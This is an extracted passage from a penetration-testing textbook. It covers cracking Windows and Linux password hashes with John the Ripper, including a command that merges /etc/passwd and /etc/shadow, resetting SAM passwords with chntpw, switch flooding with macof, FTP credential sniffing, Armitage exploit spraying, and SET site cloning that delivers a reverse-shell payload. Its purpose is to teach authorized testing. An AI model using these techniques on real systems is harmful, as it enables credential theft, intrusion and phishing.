to the exact spelling and capitalization of directory, ﬁle, and folder names when issuing
commands. Depending on the version of Windows you are targeting, you may ﬁnd
“system32” or “System32” being used. Mistyping the name will cause the command to
error out and fail.
[Word Count: 59]

With the hashes now extracted, we can proceed to crack them with JtR.
[Word Count: 13]

Now that we have the password hashes saved, we need to transfer them off the
live Kali disk. This can be done by simply e-mailing the hashes.txt ﬁle to yourself
or inserting a thumb drive and creating a local copy of the hashes. Either way,
make sure you save the hashes.txt ﬁle because you are working off a “live” CD
and your changes are not persistent. This means when you reboot the target
machine, all the ﬁles you created in the Kali disk will be gone for good!
[Word Count: 88]

With the password hash ﬁle from your target system in-hand, you can begin the
process of cracking the passwords. To accomplish this task, we will use a tool
called JtR. Like each of the other tools we have examined, JtR is available for free.
You can download it from http://www.openwall.com/john. Before we begin
utilizing JtR, it is important that you understand how Microsoft creates password
hashes.
[Word Count: 66]

Originally Microsoft utilized a hashing algorithm called Lan Manager (or LM for
short). LM hashes suffered from several key weaknesses that made password
cracking a trivial task. First, when LM hashes are created, the entire password is
converted to uppercase. Converting all the characters used in a password to
uppercase is a fundamental ﬂaw that greatly reduces the strength of any
[Word Count: 61]

password. This is because technically if we hash the word “Password” and
“password”, even though they are only different by a single case of a single letter,
these two words will produce a different hash output. However, because LM
hashes convert every character to uppercase, we drastically reduce the number of
guesses we need to make. Instead of requiring an attacker to guess “password”,
“Password”, “PASsword”, and so on, with every possible combination of upper
and lowercase letters, the attacker only needs to make the single guess of
“PASSWORD”.
[Word Count: 89]

To further compound this issue, every LM password is 14 characters in length. If
a password is <14 characters, the missing letters are ﬁlled in with null values. If
a password is >14 characters, the password is truncated at 14 characters.
[Word Count: 41]

The ﬁnal nail in the cofﬁn of LM passwords (as if it needed another) is the fact
that all stored passwords, which are now 14 characters in length, actually get
split in half and stored as two individual seven-character passwords. The length
of a password is one source of its strength; unfortunately because of the LM
design, the max password that needs to be cracked is seven characters. John will
actually attempt to crack each of the seven-character halves of the password
individually and typically makes very short work out of it.
[Word Count: 92]

Take a moment to consider these ﬂaws. When taken together, they represent
quite a blow to the security of any system. Suppose our favorite Network Admin,
Ben Owned is utilizing LM hashes on his Windows machine. He is aware of the
dangers of weak passwords so he creates the following password, which he
believes is secure: SuperSecretPassword!@#$.
[Word Count: 57]

Unfortunately for Ben, he is operating under a false sense of security. His
complex password will actually undergo a series of changes that make it much
less
secure.
First,
the
password
is
converted
to
all-uppercase:
SUPER-
SECRETPASSWORD!@#$. Next, the password is truncated to be exactly 14
characters, with any remaining letters simply discarded. The new password is:
SUPERSECRETPAS. Finally, the password is broken into equal halves of seven
characters each: SUPERSE and CRETPAS.
[Word Count: 73]

When a hacker or penetration tester gets ahold of Ben’s password, the attacker
has to crack two simple, all-uppercase, seven-character passwords. That is
a drastically simpler task than the original password of SuperSecretPassword!
@#$.
[Word Count: 34]

The Basics of Hacking and Penetration Testing
104
[Word Count: 8]

JtR is built into Kali. In order to run John, we do not need to be in any directory,
we can call it from anywhere since the John binary is located in /usr/sbin/john.
We can run John by simply typing the following commands:
[Word Count: 43]

Assuming our previously extracted “hashes.txt” ﬁle is located in the /tmp/ folder,
from the command line, we can issue the following command:
[Word Count: 22]

In the command above, “john” is used to invoke the password cracking JtR
program. The next command “/tmp/hashes.txt” is used to specify the location of
the hashes that we extracted using Samdump2. If you saved your hashes.txt ﬁle
to a different location, you will need to change this path.
[Word Count: 49]

John is pretty good about guessing the type of password you want to crack
but it is always best to specify. To specify the password type, use the
“--format ¼ format_name” command. John is capable of cracking dozens of
different password hashes; you can ﬁnd the details of each in the documentation
or on the openwall.com website. Recall that most modern Windows systems
make use of NTLM hashes. If your target uses NTLM hashes, you will need to
append the “--format¼nt” switch to your original command. In this case, the
command would look like the following:
[Word Count: 96]

After issuing the appropriate command to instruct JtR to run, the program will
attempt to crack the passwords contained in the hashes.txt ﬁle. When John is
successful in ﬁnding a password, it will display it to the screen. Figure 4.10 shows
the commands used to move into the John directory, executing JtR, and the
output of user names and passwords that were cracked. John presents the clear-
text password on the left and the user name enclosed in parenthesis on the right.
[Word Count: 82]

1.
Shut down the target machine.
2.
Boot the target to Backtack or an alternate OS via a live CD or USB drive.
3.
Mount the local hard drive.
4.
Use Samdump2 and to extract the hashes.
5.
Use JtR to crack the passwords.
[Word Count: 44]

FIGURE 4.10
Cracked passwords from John the Ripper.
[Word Count: 8]

The Basics of Hacking and Penetration Testing
106
[Word Count: 8]

These hashes can then be copied (directly from the terminal) and pasted into
a text ﬁle. With the remote hashes in our possession, we can navigate to the JtR
directory and utilize John to crack the passwords.
[Word Count: 37]

LINUX PASSWORD CRACKING AND A QUICK EXAMPLE
OF PRIVILEGE ESCALATION
[Word Count: 10]

The process of cracking Linux and OS X passwords is much the same as the
method described above with a few slight modiﬁcations. Linux systems do not
use an SAM ﬁle to store the password hashes. Rather the encrypted Linux
password hashes are contained in a ﬁle called the “shadow” ﬁle which is located
at /etc/shadow.
[Word Count: 56]

The bad news is that only privileged users can access the /etc/shadow ﬁle. If you
have the appropriate privilege level to view the /etc/shadow ﬁle, you can simply
copy the user names and hashes and begin cracking the passwords with John.
Unfortunately, most users do not have access to this ﬁle.
[Word Count: 51]

The good news is that if you do not have the appropriate privilege level to view
the /etc/shadow ﬁle, there is another method. Linux also makes use of a redacted
password list located at /etc/passwd. This list is typically readable by all users and
we can utilize a special function included with JtR to combine the /etc/shadow
and /etc/password lists. The output of this process is a single list which includes
the original hashes. This new list can then be fed into John and cracked like all of
our previous examples.
[Word Count: 91]

In many respects, this is similar to how we had to use the “system” ﬁle with the
SAM ﬁle to extract Windows password hashes. Unprivileged users can combine
[Word Count: 28]

FIGURE 4.11
Utilizing meterpreter to access remote password hashes.
[Word Count: 9]

the /etc/shadow and /etc/passwd lists by utilizing the “unshadow” command. To
combine the two lists, issue the following command in a terminal:
[Word Count: 22]

unshadow /etc/passwd /etc/shadow > /tmp/linux_hashes.txt
[Word Count: 5]

This command will join the /etc/passwd with the /etc/shadow ﬁle and store the
results in a ﬁle called “linux_hashes.txt” in the /tmp directory.
[Word Count: 23]

Now that we have extracted the hashes, we are almost ready to begin cracking the
Linux passwords. Most modern Linux systems store their passwords using the
secure hash algorithm (SHA), so be sure that your version of JtR is capable of
cracking SHA hashes. Once we have the correct version of JtR running, we can
complete this task by issuing the following command:
[Word Count: 63]

JtR contains many more options and switches that can be used to greatly
improve your cracking time and chances of success. You should spend some
time learning about each of these switches.
[Word Count: 32]

PASSWORD RESETTING: THE BUILDING AND THE
WRECKING BALL
[Word Count: 8]

Password resetting is a technique that allows an attacker to literally overwrite the
SAM ﬁle and create a new password for any user on a modern Windows system.
This process can be performed without ever knowing the original password,
although as mentioned, it does require you to have physical access to the machine.
[Word Count: 53]

As with all other techniques discussed in this book, it is vital that you have
authorization before proceeding with this attack. It is also important you un-
derstand the implications of this technique. Once you change the password,
[Word Count: 38]

The Basics of Hacking and Penetration Testing
108
[Word Count: 8]

there will be no way to restore it. Remember the wrecking ball analogy? It may be
effective but the original wall will never look the same. When you reset the
password, the next time a user attempts to login and ﬁnds that the password has
been changed; you can bet that someone is going to notice.
[Word Count: 56]

Regardless, this is still an incredibly powerful technique and one that can be very
handy for gaining access to a system. To perform password resetting, you will
need to once again boot the target system to a Kali DVD or thumb drive. Once
booted, from the terminal, you will need to mount the physical hard drive of the
system containing the SAM ﬁle. You can ﬁnd the instructions for performing this
task in the previous section.
[Word Count: 76]

From here, you can run the “chntpw” command to reset the password. To review
the full options and available switches, you can issue the following command:
[Word Count: 26]

Assume that you want to reset the administrator password on your target
machine. To accomplish this, you would issue the following command:
[Word Count: 22]

chntpw ei /mnt/sda1/WINDOWS/system32/config/SAM
[Word Count: 3]

In the command above, the “chntpw” is used to start the password resetting
program. The “ei” is used to run the program interactively and allow you to
choose the user you would like reset. The “/mnt/sda1/WINDOWS/system32/
conﬁg/SAM” is the mounted directory containing the SAM ﬁle of our target
machine. It is important to make sure you have access to the SAM ﬁle; remember
not all drives are listed as sda1. As mentioned earlier, running the “fdisk el”
command can be helpful in determining the appropriate drive.
[Word Count: 86]

After running the “chntpw ei /mnt/sda1/WINDOWS/system32/conﬁg/SAM”
command, you will be presented with a series of interactive menu-driven options
thatwillallowyoutoreset the password for the desired user.Eachofthe stepsisvery
clearly laid out and described; you simply need to take a few moments to read what
is being asked. The program is actually designed with a series of “default” answers
and in most cases, you can simply hit the “enter” key to accept the default choice.
[Word Count: 72]

As shown in Figure 4.12, after loading, the ﬁrst question you are asked is “What
to do [1]?” Above the question, you will see a series of options to choose from.
[Word Count: 31]

Simply enter the number or letter that corresponds to the choice you want to
make and hit the “enter” key to continue. The “[1]” after the question indicates
that choice “1” is the default.
[Word Count: 34]

In our example, we are planning to reset the password for the administrator
account, so we can type “1” and hit enter or simply hit the enter key to accept the
default. Next we are presented with a list of users available on the local Windows
machine. You can select the desired user by typing in his or her user name as
displayed. Once again, the default option is set to “Administrator”. Figure 4.13
shows a screenshot of the available users.
[Word Count: 81]

Here again, we can simply hit the “enter” key to accept the default choice of
“Administrator”. Next, we are presented with the various options for editing the
user on the target machine as shown in Figure 4.14. Please note that at this step,
you do not want to accept the default option!
[Word Count: 52]

FIGURE 4.13
List of available users to reset password.
[Word Count: 9]

The Basics of Hacking and Penetration Testing
110
[Word Count: 8]

The password for the selected user has now been cleared and is blank. You can
shut down Kali by issuing the “reboot” command and ejecting the DVD.
When Windows restarts, you can log into the account by leaving the password
blank.
[Word Count: 41]

With a little practice, this entire process, including booting Kali, clearing the
password, and booting into Windows, can be completed in <5 min.
[Word Count: 23]

Another popular technique that can be used to gain access to systems is network
snifﬁng. Snifﬁng is the process of capturing and viewing trafﬁc as it is passed
along the network. Several popular protocols in use today still send sensitive and
important information over the network without encryption. Network trafﬁc
sent without using encryption is often referred to as clear text because it is human
readable and requires no deciphering. Snifﬁng clear-text network trafﬁc is
a trivial but effective means of gaining access to systems.
[Word Count: 85]

Before we begin snifﬁng trafﬁc, it is important that you understand some basic
network information. The difference between promiscuous mode and non-
promiscuous network modes will be discussed ﬁrst.
[Word Count: 29]

Promiscuous mode on the other hand is used to force the NIC to accept all
packets that arrive. In promiscuous mode, all network trafﬁc is passed onto the
CPU for processing regardless of whether it was destined for the system or not.
[Word Count: 42]

In order to successfully sniff network trafﬁc that is not normally destined for
your PC, you must make sure your network card is in promiscuous mode.
[Word Count: 26]

You may be wondering how it is possible that network trafﬁc would arrive at
a computer or device if the trafﬁc was not addressed to the device. There are
several possible scenarios where this situation may arise. First, any trafﬁc that is
broadcast on the network will be sent to all connected devices. Another example
is networks that use hubs rather than switches to route trafﬁc.
[Word Count: 66]

A hub works by simply sending all the trafﬁc it receives to all the devices con-
nected to its physical ports. In networks that use a hub, your NIC is constantly
disregarding packets that do not belong to it. For example, assume we have
a small eight-port hub with eight computers plugged into the hub. In this
environment, when the PC plugged into port number 1 wants to send a message
to the PC plugged into port number 7, the message (network trafﬁc) is actually
[Word Count: 85]

delivered to all the computers plugged into the hub. However, assuming all the
computers are in nonpromiscuous mode, machines 2e6 and 8 simply disregard
the trafﬁc.
[Word Count: 26]

You should be aware that some switches are conﬁgured to “fail closed”. Switches
that fail closed operate in exactly the opposite manner of a fail open switch. Rather
than broadcasting all trafﬁc to all ports, fail closed switches simply stop routing
trafﬁc altogether. However, as a penetration tester or hacker, there is an upside to
this conﬁguration as well. If you are able to prevent the switch from routing trafﬁc,
you have stopped all trafﬁc on the network and caused a denial of service.
[Word Count: 84]

Assume that during your penetration test, you discovered a switch with an IP
address of 192.168.18.2. Let us also assume that the machine you are currently
[Word Count: 26]

The Basics of Hacking and Penetration Testing
112
[Word Count: 8]

using (either directly or through pivoting) is connected to the switch and that
you want to sniff all the trafﬁc ﬂowing through the device in order to discover
additional targets and locate clear-text passwords.
[Word Count: 34]

macof ei eth0 es 192.168.18.130 ed 192.168.18.2
[Word Count: 7]

In the preceding example, “macof” is used to invoke the program. The macof
program will generate and ﬂood the network with thousands of MAC addresses.
The “ei” switch is used to specify your computer’s network card. This is where
the MAC addresses will be sent from. The “es” is used to specify the source
address. The “ed” is used to specify the destination or target of your attack.
Figure 4.15 shows an example of the command used to start macof, and a small
selection of the generated output.
[Word Count: 88]

As a ﬁnal word of caution, using macof will generate tremendous amounts of
network trafﬁc and is therefore easily detectable. You should use this technique
only when stealth is not a concern.
[Word Count: 32]

FIGURE 4.15
Using macof to ﬂood a switch.
[Word Count: 8]

Wireshark is built into Kali and can be accessed through the all programs menu
or by opening a terminal window and entering the “wireshark” command as
shown below:
[Word Count: 28]

Be sure that you have enabled and conﬁgured at least one network interface in
Kali before running Wireshark. The instructions for doing this can be found in
Chapter 1.
[Word Count: 29]

When you ﬁrst start Wireshark inside of Kali, you will get a message telling you
that “running Wireshark as user ‘root’ can be dangerous.” You can click “Ok” to
acknowledge this warning. Next, you will need to select your network card and
ensure that it is properly set up to capture all available trafﬁc. You can do this by
clicking on the icon showing a network card and a menu list. The icon is located in
the upper left corner of the program. Figure 4.16 shows a screenshot of the button.
[Word Count: 91]

Selecting the “list available capture interfaces.” button will bring up a new
window displaying all the available interfaces. From here, you will be able to view
and select the appropriate interface. You can begin a simple capture by choosing
the appropriate interface, accepting the defaults, and clicking on the “start” button.
You can also customize your capture options by clicking on the “options” button.
Figure 4.17 shows an example of the Wireshark Capture Interfaces window.
[Word Count: 75]

FIGURE 4.16
Wireshark button to select the capture interface.
[Word Count: 9]

FIGURE 4.17
Wireshark capture interface window.
[Word Count: 6]

The Basics of Hacking and Penetration Testing
114
[Word Count: 8]

Because we are focusing on the basics, we will leave the default options and
select the “start” button. On a busy network, the Wireshark capture window
should ﬁll rapidly and continue to stream packets as long as you let the capture
run. Do not worry about attempting to view this information on the ﬂy.
Wireshark allows us to save the capture results and review them later.
[Word Count: 66]

Recall from Chapter 3 that our Linux target (Metasploitable) had an FTP server
running. To demo the power of network snifﬁng, ﬁrst begin a Wireshark capture
and then open a new terminal and log into the target FTP server which is run-
ning on Metasploitable. To access an FTP server from the terminal window, issue
the command “ftp” followed by the IP address of the server you are attempting
to access as shown below:
[Word Count: 74]

At this point, you will be presented with a login prompt. Provide a user name of
ownedb and a password of toor. Please note that if you are attempting to log into
the Metasploitable FTP server, your credentials will be invalid. However, for the
purpose of this demo, that is acceptable. After letting the Wireshark capture run
for several seconds after you attempt to login, stop the capture by clicking on the
button with a network card; a red “x”. This button is located in the menu at the
top of the Wireshark capture window as shown in Figure 4.18.
[Word Count: 100]

If you performed a capture on a particularly busy network, you may ﬁnd the
volume and sheer number of captured packets overwhelming. Manually
reviewing a large packet capture may not be feasible. Luckily, Wireshark includes
a ﬁlter that can be used to drill down and reﬁne the displayed output. Revisiting
our previous example, we could enter the keyword “ftp” in the ﬁlter box and
click the “apply” button. This will cause Wireshark to remove all packets that do
not belong to the FTP protocol from our current view. Obviously, this will
[Word Count: 91]

FIGURE 4.18
Stopping the Wireshark capture.
[Word Count: 6]

signiﬁcantly reduce the number of packets we need to review. Wireshark
includes some incredibly powerful ﬁlters. It is well worth the effort to take the
time to review and master Wireshark ﬁlters. It should be pointed out that you
can always remove your current ﬁltered view and go back to the original packet
capture by clicking the “clear” button.
[Word Count: 59]

ARMITAGE: INTRODUCING DOUG FLUTIE OF HACKING
[Word Count: 6]

If you are a sports fan, you probably remember (or have heard about) Doug
Flutie’s last second Hail Mary pass to give BC the win over Miami. In this section,
we are going to discuss Metasploit’s Hail Mary implementation.
[Word Count: 39]

Armitage is a GUI-driven front-end which sits on top of Metasploit and gives us
the ability to “hack like the movies”. Armitage is available for free and built into
Backtrack. If you are running Kali, you may need to install it before using. You
can review the details of Armitage by visiting the ofﬁcial project page at http://
www.fastandeasyhacking.com/.
[Word Count: 59]

If your version of Kali does not have Armitage installed, you can install it by running the
following commands:
[Word Count: 19]

Once Armitage has been installed, you will need to start the PostgreSQL service by
issuing the following command in a terminal:
[Word Count: 21]

At this point, you should be able to proceed with running Armitage as discussed in this
section. If you get an error message that says “Try setting MSF_DATABASE_CONFIG to
a ﬁle that exists,” you will need to run the following command and restart Armitage:
[Word Count: 44]

FIGURE 4.19
Using Wireshark to sniff FTP credentials.
[Word Count: 8]

The Basics of Hacking and Penetration Testing
116
[Word Count: 8]

An earlier section described the use of Metasploit as a sniper riﬂe for taking down
vulnerable and unpatched systems. Armitage is built on Metasploit; but rather
than requiring the penetration tester to dig for vulnerabilities and match
exploits, Armitage includes functionality which can be used to automate the entire
process. When using Armitage’s “Hail Mary” function, the only thing a pene-
tration tester needs to do is to enter the target’s IP address and click a few icons.
[Word Count: 78]

There is nothing subtle or stealthy about Armitage’s Hail Mary function. The tool
works by conducting a port scan of the target; based on the information returned
from the port scan, Armitage sprays every known or possible matching exploit
against the target. Armitage takes the “let’s throw everything at the wall and see
what sticks” approach to exploitation. Even if Armitage is successful in getting
a shell, the tool continues spraying attacks against the target until all the possible
exploits have been attempted. When used against weak targets, this will often
lead to multiple shells.
[Word Count: 95]

ItisimportanttopointoutthatArmitage canbeutilized inamuchmoresubtleway
including conducting reconnaissance and scanning against a single target. How-
ever, for the purpose of this book, we will focus on the M-60 approach of spraying
as many bullets as possible and focusing on sheer volume rather than accuracy.
[Word Count: 42]

Armitage can be accessed by navigating the Kali, all programs menu or by
opening a terminal and entering the “armitage” command as shown below:
[Word Count: 24]

After entering the command into a terminal, you will be presented with
a “connect.” dialog box as shown in ﬁgure 4.20. To start Armitage, you can
leave the default values and click the “connect” button.
[Word Count: 35]

After clicking the “connect” button, you will be presented with a dialog box
which asks whether you want to start Metasploit. Select the default answer of
“yes”. Next, you will be presented with a “java.net.ConnectionException: Con-
nection refused” dialog box. Just leave this while Armitage and Metasploit get
[Word Count: 48]

everything set up for you. Eventually you will be presented with a GUI as shown
in Figure 4.21.
[Word Count: 18]

The main Armitage screen can be subdivided up into two areas. The top half
consists of the GUI which allows you to interact with Metasploit, whereas the
bottom half provides command line access for each interaction (as if you were
utilizing the terminal rather than a GUI). You can use both panels to interact
with the target. As you perform more actions utilizing the top half of Armitage,
new corresponding tabs will automatically open for you on the bottom half.
You can interact with the various tabs by clicking on them and typing in the
displayed terminal.
[Word Count: 97]

Armitage provides a ton of functionality above and beyond the Hail Mary attack that we
are going to use. Take some time to learn its full potential.
[Word Count: 27]

The Basics of Hacking and Penetration Testing
118
[Word Count: 8]

WHY LEARN FIVE TOOLS WHEN ONE WORKS JUST
AS WELL?
[Word Count: 10]

When all else fails, you may want to bust out the M-60. The easiest way to do this
is to access Armitage’s “Hail Mary” program. However, before we can begin
spraying exploits at our target, we need to do a little prework. First, we instruct
Armitage to scan our local network and identify any live targets. To run a scan,
click on the “hosts” option located in the menu and then choose “Quick Scan
(OS detect)” as shown in Figure 4.22.
[Word Count: 81]

After selecting the “Quick Scan (OS detect)” you will need to provide a valid IP
address or IP range to scan. Once the scan has ﬁnished, any identiﬁed targets will
now show up as a monitor in the workspace. Figure 4.23 provides an example of
this output. A message box will also appear instructing you to “Use
Attacks / Find Attacks” to locate exploits.
[Word Count: 64]

As long as Armitage has identiﬁed at least one potential target, you are ready to
unleash a torrent of exploits. To accomplish this, simply click “Attacks” from the
menu followed by “Hail Mary” as shown in Figure 4.24.
[Word Count: 38]

FIGURE 4.22
Running a Nmap scan from Armitage to identify targets.
[Word Count: 11]

monitor representing your target within Armitage; if the target becomes
outlined in red lightning bolts, Armitage has successfully compromised the
target. Figure 4.25 shows an example of a compromised target with three
active remote shells.
[Word Count: 35]

When Armitage has exhausted its supply of potential exploits, you can view any
and all of the shells that were obtained by right clicking on the (now lightning-
bolt wrapped) monitor as shown in Figure 4.26.
[Word Count: 36]

At this point you can interact with the target, upload programs and material to
the target, or perform a variety of other attacks. To gain a shell and run com-
mands on the remote target, click the “interact” option. This will allow you to
issue and run commands in the lower terminal window of Armitage. All the
commands you run will execute on the remote machine as if you had physical
access and were typing at a local terminal on the target.
[Word Count: 82]

Obviously at this point, the exploitation phase is over for this target!
[Word Count: 12]

FIGURE 4.24
Running a Hail Mary with Armitage.
[Word Count: 8]

FIGURE 4.23
Screenshot showing Armitage has identiﬁed a potential target.
[Word Count: 10]

The Basics of Hacking and Penetration Testing
120
[Word Count: 8]

FIGURE 4.25
Armitage success and three remote shells.
[Word Count: 8]

FIGURE 4.26
Interacting with a remote shell through Armitage.
[Word Count: 9]

There are several ways to practice this step; the easiest way is to set up a vulner-
able target in your penetration-testing lab. Once again, using virtual machines is
helpful because exploitation can be a very destructive process and resetting
a virtual machine is often easier and faster than reimaging a physical machine.
[Word Count: 53]

As mentioned several times, you should try to obtain a legal copy of Microsoft’s
XP to add to your pen testing lab environment. You should be able to ﬁnd a legal
copy on eBay, Amazon, or Craigslist. Just make sure you are purchasing a gen-
uine copy so that you can stay on the right side of the end-user license agree-
ment. It is always suggested that newcomers begin with XP because there are still
abundant copies available and there are standing exploits in the Metasploit
framework that will allow you to practice your Metasploit-fu.
[Word Count: 95]

Old versions of Linux are also a great source of “exploitable targets”. The crew
from Kali created a free Metasploit training module called “Metasploit
[Word Count: 24]

The Basics of Hacking and Penetration Testing
122
[Word Count: 8]

Unleashed”. It is strongly recommended that you explore this resource after
completing this book. The Metasploit Unleashed project contains a detailed
description of how to download and set up Ubuntu 7.04 with Samba installed.
Creating a virtual machine with Ubuntu 7.04 and Samba running is a way of
setting up a free (as in no cost) vulnerable target and allows you to practice
attacking a Linux system.
[Word Count: 67]

Finally, Thomas Wilhelm has graciously created and offered for free a series of
entertaining, challenging, and highly customizable live Linux CDs called
De-ICE. The De-ICE CDs allow you to practice a series of penetration testing
challenges following a realistic scenario. You can get your hands on these great
CDs by downloading them at http://heorot.net/livecds/. The CDs are great
because they present you with a realistic simulation of an actual penetration test.
[Word Count: 71]

Another great feature of the De-ICE CDs is that you will not be able to simply
autopwn your way through the challenges. Each De-ICE CD includes several
different levels of challenges that you must complete. As you work your way
through the challenges, you will need to learn to think critically and use many of
the tools and techniques we have discussed in steps 1e3.
[Word Count: 65]

Setting up and working your way through all the vulnerable targets described
above should be an enjoyable process. Below you will ﬁnd some speciﬁc tips for
setting up targets to practice each of the tools that were discussed in this chapter.
[Word Count: 41]

The easiest way to practice Medusa is to start a remote process on a target
machine. Try starting Telnet on a Windows machine and SSH or FTP on a Linux
machine. You will need to create a few additional users and passwords with
access to the remote services. Once you have the remote service running, you can
practice using Medusa to gain access to the remote system.
[Word Count: 67]

As we have mentioned, the easiest way to practice Metasploit and Armitage is by
setting up an older version of Windows XP as the target; remember the lower the
service pack, the better. You can also download a copy of Ubuntu 7.04 and
install Samba on it. For the examples in this book, we have used Metasploitable.
[Word Count: 57]

To practice with JtR and chntpw, you can set up a victim machine with several
user accounts and different passwords. It is highly suggested that you vary the
strength of the passwords for each account. Make a few user accounts with weak
three- and four-letter passwords and make others with longer passwords that
include uppercase and lowercase letters along with special characters.
[Word Count: 62]

At this point you should have a solid understanding of the basic steps required
to exploit and gain access to a system. Remember your attack methods will
change based on your target and desired goal. Now that you understand the
basics, you should be ready to tackle some more advanced topics.
[Word Count: 51]

You should take some time and review the password brute forcing tool Hydra. This
tool functions much like Medusa but provides a few extra switches to give you
some additional options. Carefully review each of the switches supported by
Hydra. You can ﬁnd the switches and a brief description by reviewing the Hydra
man pages. It is recommended that you pay special attention to the timing option.
The ability to control the timing or rate of connections is handy for correcting
many connection errors that occur when we utilize online password crackers.
[Word Count: 92]

The Basics of Hacking and Penetration Testing
124
[Word Count: 8]

Ettercap is another fantastic tool that has many powerful features and abilities.
Ettercap is a great tool for conducting man-in-the-middle attacks. Ettercap works
by tricking clients into sending network trafﬁc through the attacker machine. This
is a great way to get user names and passwords from machines on the local LAN.
Once you have successfully studied and used Wireshark, dsniff, tcpdump, and
Ettercap, you will be well on your way to mastering the basics of network snifﬁng.
[Word Count: 77]

If you cannot ﬁnd a matching exploit in Metasploit, try searching the Exploit-DB.
This is a public repository of exploits and Proof of Concept code. Oftentimes the
exploit code can be downloaded, tweaked, and launched to successfully own
your target system.
[Word Count: 41]

Stack and heap-based buffer overﬂows, which are responsible for many of the
exploits available today, often seem like magic or voodoo to newcomers.
However, with some dedicated and careful self-study, these topics can be
demystiﬁed and even mastered.
[Word Count: 38]

Advancing your skill level to the point of being able to ﬁnd buffer overﬂows and
write shell code often requires some additional training. Although this training
is not strictly required, it certainly makes the process of learning advanced
exploitation much easier. Whenever possible, you should spend time learning
a programming language like “C”. Once you are comfortable with C, you should
focus on understanding at least the basics of Assembly Language. Having a solid
understanding of these topics will help dispel much of the “black-magic” feel
many people have when they ﬁrst encounter buffer overﬂows.
[Word Count: 95]

Finally, since we are on the subject of programming, I encourage you to become
proﬁcient in a scripting language as well. Python and Ruby are excellent choices
and can help you extend and automate tools and tasks.
[Word Count: 37]

The Basics of Hacking and Penetration Testing
126
[Word Count: 8]

The Basics of Hacking and Penetration Testing. http://dx.doi.org/10.1016/B978-0-12-411644-3.00005-4
Copyright  2013, 2011 Elsevier Inc. All rights reserved.
[Word Count: 17]

One of my favorite social engineering engagements was performing an attack
against a Fortune 1000 organization. The attack took advantage of expiring
medical beneﬁts unless an employee signed off on the policy. This is the perfect
attack because it plays on human emotions, however stays within the conﬁnes of
normal behavior and expectations as an employee. When the attack went out, it
was only sent to four people (in order to not create alarms). The success rate
ended up being 100%. This all purely depends on how much effort and time you
put into making your attack believable.
[Word Count: 98]

The social-engineer toolkit (SET) is a tool that helps automate some insanely
complex techniques and make your attacks believable. A tool is just that, a tool.
Think of SET as a sword. The sword is only as good as the swordsman’s skill and
understanding of how to use the sword. Understanding how to customize and
use the SET to its fullest capacity will make your success ratios on social-
engineering attacks extremely successful.
[Word Count: 73]

So what is SET? SET is an exploitation framework purely dedicated to social
engineering. It allows you to rapidly create a number of advanced attack vectors
without the need of a signiﬁcant programming background or years of maturity.
SET has become the standard for penetration testers, and a method for attacking
organizations and identifying how well they can withstand a targeted attack
through social-engineering methods.
[Word Count: 65]

In Kali, as you know, the folder structure places the binaries in /usr/bin/
<insert_toolname_here> and the actual ﬁles for the application in /usr/share/
<insert_toolname_folder_here>. SET is no different in Kali and installs in the
/usr/share/setoolkit directory and can be started anywhere from the command
line by issuing the following command:
[Word Count: 50]

This will take you to the main SET interface. There are a few options available as
depicted in Figure 5.1.
[Word Count: 20]

Once inside, the menus give you the available options for the social-engineering
attacks. Let us do a quick breakdown of the attack vectors. Because we are
[Word Count: 26]

The Basics of Hacking and Penetration Testing
128
[Word Count: 8]

covering the basics we will not be diving into each one, but an understanding
may help you down the road. The spear phishing attacks are specially crafted
e-mails with malicious attachments. This may seem like what you hear about all
the time in the news, but these attack vectors can be very difﬁcult to pull off. For
example, the majority of exploits that comes out for Adobe, Ofﬁce, and others
are usually quickly patched and are almost instantly detected by antivirus when
ﬁrst released.
[Word Count: 84]

As an attacker, and especially going into an organization as a penetration tester,
you will typically only have one shot to pull off your attack. Exploits themselves
are extremely speciﬁc on versioning. Let us take a look at an example: In 2013,
[Word Count: 42]

FIGURE 5.1
The menus within the social-engineer toolkit (SET).
[Word Count: 9]

FIGURE 5.2
Inside the social engineering menus.
[Word Count: 7]

Scott Bell released a Metasploit module for an Internet Explorer use-after-free
vulnerability. When using the Internet Explorer exploit, simply browsing to
the malicious website would compromise your computer. This was an amazing
exploit and a truly great example of precision and research. The only issue with
this exploit is it only supported Internet Explorer 8 on Windows XP SP3 as
shown in Figure 5.3.
[Word Count: 64]

FIGURE 5.3
Target for IE 8 on Windows XP SP3 only.
[Word Count: 11]

The Basics of Hacking and Penetration Testing
130
[Word Count: 8]

ratio by antivirus vendors. We would need to heavily obfuscate our code in order
to circumvent basic protections that corporations have. Since we have all these
hurdles we have to deal with, oftentimes in social engineering, you need a route
that you know will be successful. Targeted spear phishing is good as long as you
know your target inside and out. Attaching out of the box Portable Document
Formats or Word documents that contain exploits rarely works.
[Word Count: 77]

One of SET’s ﬂagship attack vectors is the website attack vectors. The attacks
built into this group are highly successful and take advantage of believability
(our friend in social engineering (SE)). When navigating SET, you will ﬁnd the
menu shown in Figure 5.4 if you select option 2 from the social-engineering
attacks.
[Word Count: 52]

Once you select the “site cloner”, select “no” for Network Address Translation
(NAT) or port forwarding. This would be used only if you were behind a router
and had port forwarding in place and needed to forward ports. Next, enter the
Internet protocol (IP) address of your machine (the attacker) as shown in
Figure 5.5.
[Word Count: 55]

FIGURE 5.4
Inside the Java applet attack method.
[Word Count: 8]

Next, we specify what page we want to clone, we will use https://www.trustedsec.
com as our target. You should notice that it clones and places you in a menu to
select your payloads as shown in Figure 5.6:
[Word Count: 38]

FIGURE 5.5
Enter the IP address of your attack machine.
[Word Count: 10]

FIGURE 5.6
Payload selection within SET.
[Word Count: 6]

The Basics of Hacking and Penetration Testing
132
[Word Count: 8]

Next, select 1 for the Windows meterpreter reverse TCP payload. When your
screen is loading, it should look similar to Figure 5.7.
[Word Count: 22]

Once SET is ﬁnished loading, it will launch Metasploit automatically. You
should see something similar to Figure 5.8.
[Word Count: 18]

FIGURE 5.7
Payload selection within SET.
[Word Count: 6]

Next, use the Windows target machine and browse to the malicious cloned
website (residing on our Kali machine) by entering the IP address of the attacker
machine into the uniform resource locator (URL) of the target machine’s
browser. You should see something that looks similar to Figure 5.9.
[Word Count: 48]

After clicking “I accept”, then “run” you can switch back to your Kali machine. At
this point, you should notice multiple meterpreter shells as shown in
Figure 5.10.
[Word Count: 28]

The Basics of Hacking and Penetration Testing
134
[Word Count: 8]

This attack vector works well; however, there are a few things that we need to take
into consideration when pulling this off. First, we need to clone or create
a website that will be believable to the company we are targeting. In this
example, if we were targeting TrustedSec, we may want to clone an HR portal,
extranet website, time system, or other systems that they may be familiar with.
Also, one clear indicator that this website is a fake is the IP address in the URL
bar as shown in Figure 5.11.
[Word Count: 93]

